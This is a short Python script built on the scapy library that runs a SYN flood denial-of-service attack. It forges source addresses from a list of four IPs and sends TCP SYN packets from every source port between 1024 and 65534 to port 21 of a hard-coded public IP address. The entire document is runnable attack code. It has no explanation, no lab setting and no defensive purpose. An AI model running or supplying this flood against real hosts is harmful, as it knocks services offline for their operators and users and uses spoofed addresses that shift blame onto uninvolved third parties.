from scapy.all import *
import random

def synFlood(tgt,dport):
	srcList=['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
	for sport in range(1024,65535):
		index=random.randrange(4)
		ipLayer=IP(src=srcList[index],dst=tgt)
		TcpLayer=TCP(sport=sport,dport=dport,flags='S')
		packet=ipLayer/TcpLayer
		send(packet)

synFlood('115.29.146.79', 21)
